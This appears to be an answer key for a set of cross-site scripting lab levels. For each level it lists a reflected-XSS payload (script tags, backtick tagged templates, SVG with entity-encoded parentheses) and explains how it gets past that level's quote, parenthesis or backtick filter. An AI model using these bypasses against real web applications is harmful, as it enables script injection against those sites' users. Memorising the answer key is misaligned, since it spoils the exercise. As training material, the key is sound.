# basic — solutions

Raw body reflection with progressive filters on quotes, parens, and backticks.

### basic-level1

`/basic/level1/?query=%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `<script>alert(1)</script>`
- context: raw reflection, no filter

### basic-level2

`/basic/level2/?query=%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `<script>alert(1)</script>`
- context: " encoded; payload has no double quotes

### basic-level3

`/basic/level3/?query=%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `<script>alert(1)</script>`
- context: ' encoded; payload has no single quotes

### basic-level4

`/basic/level4/?query=%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `<script>alert(1)</script>`
- context: both quotes encoded; payload has no quotes

### basic-level5

`/basic/level5/?query=%3Cscript%3Ealert%601%60%3C/script%3E`

- payload: `<script>alert\`1\`</script>`
- context: parens stripped; tagged template call replaces alert(1)

### basic-level6

`/basic/level6/?query=%3Cscript%3Ealert%601%60%3C/script%3E`

- payload: `<script>alert\`1\`</script>`
- context: quotes encoded + parens stripped; backticks survive

### basic-level7

`/basic/level7/?query=%3Csvg%3E%3Cscript%3Ealert%26%2340;1%26%2341;%3C/script%3E%3C/svg%3E`

- payload: `<svg><script>alert&#40;1&#41;</script></svg>`
- context: quotes + parens + backticks stripped; SVG script decodes &#40;/&#41; back to ( ) at parse time
